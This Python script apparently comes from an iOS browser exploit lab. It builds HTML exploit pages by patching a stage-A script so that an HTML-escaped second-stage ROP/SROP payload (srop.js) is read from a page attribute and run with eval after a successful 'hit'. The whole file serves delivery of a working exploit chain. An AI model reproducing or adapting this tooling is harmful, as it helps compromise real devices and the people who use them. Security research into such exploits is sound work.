#!/usr/bin/env python3
"""Build dense-H attribute ROP finals (stage A 2,036 + getAttribute tail,
data-s2 = escaped srop.js)."""
import hashlib, html, os, re, sys, zlib
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE); PAY=os.path.join(LAB,'payload')
SROP=open(os.path.join(PAY,'srop.js')).read(); ESC=html.escape(SROP,quote=True)
OLD=("var s2=null; try{s2=localStorage.getItem(\"n1s2\");}catch(e){}\n"
     "if(hit>=0 && s2){ try{(0,eval)(s2);}catch(e2){} }")
NEW=('var s2=null; try{var e=document.getElementById("s2"); if(e) s2=e.getAttribute("data-s2");}catch(e){}\n'
     'globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);\n'
     'try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}\n'
     'if(hit>=0 && s2){ try{(0,eval)(s2);}catch(e2){} }')
def build(H):
    base=open(os.path.join(PAY,f'ls_final_h{H}_2036.html')).read()
    a=re.findall(r'<script>(.*?)</script>',base,re.S)[0]
    assert OLD in a, H
    a=a.replace(OLD,NEW,1)
    h=('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
       '<div id="v">N1IOS_ATTR_ROP</div>\n<div id="s2" data-s2="'+ESC+'"></div>\n<script>'+a+'</script>\n</body></html>')
    return h
if __name__=='__main__':
    Hs=[int(x) for x in sys.argv[1:]] or [150,250]
    for H in Hs:
        h=build(H); fn=f'at_rop_final_h{H}_ios.html'; open(os.path.join(PAY,fn),'w').write(h)
        print(f'{fn} raw={len(h)} zlib9={len(zlib.compress(h.encode(),9))} sha256={hashlib.sha256(h.encode()).hexdigest()} attr_esc={len(ESC)} srop={len(SROP)}')
